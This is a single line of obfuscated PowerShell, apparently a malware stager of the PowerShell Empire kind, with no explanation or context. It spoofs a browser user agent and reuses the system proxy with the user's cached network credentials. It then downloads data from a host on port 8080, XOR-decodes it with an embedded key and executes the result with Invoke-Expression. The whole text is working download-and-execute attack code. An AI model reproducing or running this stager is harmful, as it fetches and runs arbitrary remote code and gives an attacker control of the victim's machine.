
$WC=New-ObJeCt SYsteM.NeT.WEbClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeAdErS.AdD('User-Agent',$u);$wc.ProXy = [SyStEM.NEt.WebREQUEsT]::DEfaultWebPRoXy;$Wc.PRoXy.CreDENTials = [SysTEM.NeT.CREdeNtiAlCacHE]::DEFAulTNEtwORKCrEDENTIalS;$K='zZiI74?bTGD0~QSqv|6m!1M=@^s\oPF9';$I=0;[char[]]$b=([cHAr[]]($wC.DoWnlOAdStRINg("http://192.168.1.230:8080/index.asp")))|%{$_-BXor$K[$i++%$K.LENgtH]};IEX ($b-jOin'')

